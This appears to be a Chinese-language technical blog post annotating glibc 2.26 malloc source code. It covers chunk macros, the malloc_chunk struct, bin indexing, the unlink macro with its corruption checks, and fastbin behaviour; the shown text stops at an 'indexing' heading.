

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="glibc malloc version2.26 src code analysis">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
  <title>glibc_malloc_srcCode(2.26) &amp; techniques - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":1280126539,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>nuts-and-bolts</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="glibc_malloc_srcCode(2.26) & techniques">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      Yogdzewa
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-08-09 10:07" pubdate>
        2021年8月9日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      13.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      315
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">glibc_malloc_srcCode(2.26) &amp; techniques</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：几秒前
                
              </p>
            
            <div class="markdown-body">
              <h1 id="基本数据结构及函数"><a href="#基本数据结构及函数" class="headerlink" title="基本数据结构及函数"></a>基本数据结构及函数</h1><h2 id="管理chunk"><a href="#管理chunk" class="headerlink" title="管理chunk"></a>管理chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment checks and conversions</h3><p class="note note-info"><strong><u>MALLOC_ALIGNMENT</u></strong> 在 32 平台 chunk 地址按 8 字节对齐，64 位平台按 8 字节或是 16 字节对齐</p> 

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure>

<h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>Chunks always begin on even word boundaries, so the mem portion (which is returned to the user) is also on an even word boundary, and thus at least double-word <strong>aligned</strong>.</li>
</ul>
<h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>没啥特别的, 如果有需要的话随时查找即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></td></tr></table></figure>

<h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="在malloc-state中的存储"><a href="#在malloc-state中的存储" class="headerlink" title="在malloc_state中的存储"></a>在malloc_state中的存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="bin数组定位"><a href="#bin数组定位" class="headerlink" title="bin数组定位"></a>bin数组定位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>bin_at的神奇操作: </p>
<ul>
<li>对外部而言, bin数组应该为128个, 输入的下标也是如此, 到了内部将其转换为该位置chunk的fd指针, 取地址”&amp;”, 转换为单字节指针char *, 然后减去chunk head的字节数, 变为该chunk的头部</li>
<li>除了外部下标到内部下标的转换, <strong>其余步骤相当于mem2chunk()的结果</strong> </li>
</ul>
</li>
<li><p>为什么是两个呢?</p>
<p>因为每个bin链在bins数组中存储的是一个fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p>
<blockquote>
<p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员, bin[0]为其presize, bin[1]为其size</p>
</blockquote>
<img src="https://i.loli.net/2021/08/11/sbzY4vrhU2wZypm.png" srcset="/img/loading.gif" lazyload style="zoom: 33%;" /> </li>
</ul>
<h3 id="unlink：从bins中取出chunk"><a href="#unlink：从bins中取出chunk" class="headerlink" title="unlink：从bins中取出chunk"></a>unlink：从bins中取出chunk</h3><ul>
<li>2.25中为宏定义, 2.26为unlink_chunk函数, 仅仅多了一个检查<ul>
<li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//省略了每行末尾的反斜杠</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//例子unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//取出victim的fd和bk指针</span><br>    BK = P-&gt;bk;<br>	<span class="hljs-comment">//例行检查,实际上就是如果victim没有完整的在链表中的话就报错</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果正常的话</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//取出了victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//如果在largebin里的链表 且 在chunk size链表里则需要额外设置fd_nextsize和bk_nextsize</span><br>            <span class="hljs-comment">//简单的检查, victim是不是 *完整的* 在chunk size链表</span><br>	        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>			|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>	      	malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FD和victim同样大小</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsize等于自身只能说明链表里只有这个大小</span><br>                  <span class="hljs-comment">//现在就剩下FD(后面或许还有等大的)了, 修改一下chunk size链表</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//链表里还有其他的chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victim是一个单独的chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>相关介绍和特点</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- 使用LIFO, 在链表头执行取出插入操作<br>- PREV_INUSE总为<span class="hljs-number">1</span>, 不会和相邻块进行合并<br>- chunk从不会在链表中间被删去, 只需要单向链表即可<br></code></pre></td></tr></table></figure>

<p><strong>indexing</strong> </p>
